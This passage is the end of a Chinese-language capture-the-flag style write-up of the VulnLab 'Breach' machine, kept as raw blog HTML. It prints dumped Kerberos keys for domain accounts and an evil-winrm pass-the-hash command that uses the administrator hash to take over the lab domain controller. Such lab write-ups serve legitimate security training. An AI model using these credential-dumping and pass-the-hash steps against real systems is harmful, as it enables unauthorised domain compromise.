class="line"><span class="string">breach.vl\svc_mssql:des-cbc-md5:259479d65e91adf8</span></span><br><span class="line"><span class="string">mane:aes256-cts-hmac-sha1-96:e709a36556f3d61adf9e6bdffa8a18bcf38dd6a4004908b5bdee716f56f8aa72</span></span><br><span class="line"><span class="string">mane:aes128-cts-hmac-sha1-96:7e83a88a085e2b7c22424047007331d5</span></span><br><span class="line"><span class="string">mane:des-cbc-md5:febf26b33b573268</span></span><br><span class="line"><span class="string">BREACHDC$:aes256-cts-hmac-sha1-96:5fe88fd072fc8bd9b8ae3ff4f9478bae2eabb4d958763f2b3b237f6280909abc</span></span><br><span class="line"><span class="string">BREACHDC$:aes128-cts-hmac-sha1-96:26fb3d7d49bf6d997962dc3095d810e3</span></span><br><span class="line"><span class="string">BREACHDC$:des-cbc-md5:d93dba3de3f8134c</span></span><br><span class="line"><span class="string">[*] Cleaning up...</span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br><span class="line"><span class="string">[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.</span></span><br><span class="line"><span class="string">[*] Cleaning up...</span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Pass-the-hash-to-get-admin"><a href="#Pass-the-hash-to-get-admin" class="headerlink" title="Pass the hash to get admin"></a>Pass the hash to get admin</h1><p>得到了 hash 就可以 pass the hash 去管理員賬號了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.103.36 -u administrator -H <span class="string">&quot;d9a47efd620c2f6d349dd035274d2117&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083419-tfopdgi.png" alt="image">​</p>
+<p>有意思的是另一個 flag 在共享目錄裏面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\share\transfer\julia.wong</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083858-culb81h.png" alt="image">​</p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&text=VulnLab - Machine - Breach"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&is_video=false&description=VulnLab - Machine - Breach"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Breach&body=Check out this article: https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&name=VulnLab - Machine - Breach&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&t=VulnLab - Machine - Breach"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
